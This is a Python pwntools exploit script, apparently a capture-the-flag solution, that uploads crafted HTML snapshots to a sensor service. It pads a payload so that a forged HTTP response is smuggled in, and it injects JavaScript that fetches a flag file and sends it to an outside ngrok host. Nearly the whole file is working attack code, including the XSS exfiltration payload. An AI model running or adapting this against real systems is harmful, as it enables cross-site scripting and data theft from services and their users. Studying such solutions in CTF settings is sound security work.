#!/usr/bin/env python3

from pwn import *
import os


def gogo(ip, port, token):

    embed_payload = ""
    for i in range(7):
        embed_payload += """<embed type="text/html" src="/data/snapshot/ggg?i={}" width="64" height="48">\n""".format(i)

    embed_payload = """<html><body>
    <embed type="text/html" src="/data/snapshot/check?i=1" width="64" height="48">
    {}
    <embed type="text/html" src="/data/snapshot/check?i=2" width="64" height="48">
    </body></html>""".format(embed_payload)

    check_payload = """<html><body>
    <img src="http://33ef70ee0ae3.ngrok.io/check_hit">
    </body></html>"""

    payload1 = "A"*(400*1448)
    payload2 = payload1

    inner = """<html><script>
    fetch("http://33ef70ee0ae3.ngrok.io/gotxss?a=1", { mode: "no-cors"});

    fetch("/cgi-bin/flag").then(r => r.text().then(t => fetch("http://33ef70ee0ae3.ngrok.io/flag?f=" + t, { mode: "no-cors" })));

    </script></html>"""

    payload2 += "HTTP/1.1 200 OK\r\n\r\n{}".format(inner)

    for _ in range(10):
        try:
            p = remote(ip, int(port))
            break
        except:
            sleep(1)

    p.recvuntil("token")
    p.sendline(token)
    p.recvuntil("ok")

    log.info("sending embed")
    p.sendline("embed")
    p.sendline(str(len(embed_payload)))
    p.send(embed_payload)
    p.recvuntil("ok")
    log.info("done")

    log.info("sending check")
    p.sendline("check")
    p.sendline(str(len(check_payload)))
    p.send(check_payload)
    p.recvuntil("ok")
    log.info("done")

    log.info("sending payload1")
    p.sendline("ggg")
    p.sendline(str(len(payload1)))
    p.send(payload1)
    p.recvuntil("ok")
    log.info("done")

    log.info("pre sending payload2")
    p.sendline("ggg")
    p.sendline(str(len(payload2)))
    p.send(payload2[0:-10])

    print("sleeping")
    sleep(5)

    log.info("sending the rest payload2")
    p.send(payload2[-10:])

    p.recvuntil("ok")
    print("done")

    p.close()


if __name__ == "__main__":
    gogo(os.environ.get('TARGET_IP'), os.environ.get('SENSOR_PORT'), os.environ.get('SENSOR_TOKEN'))
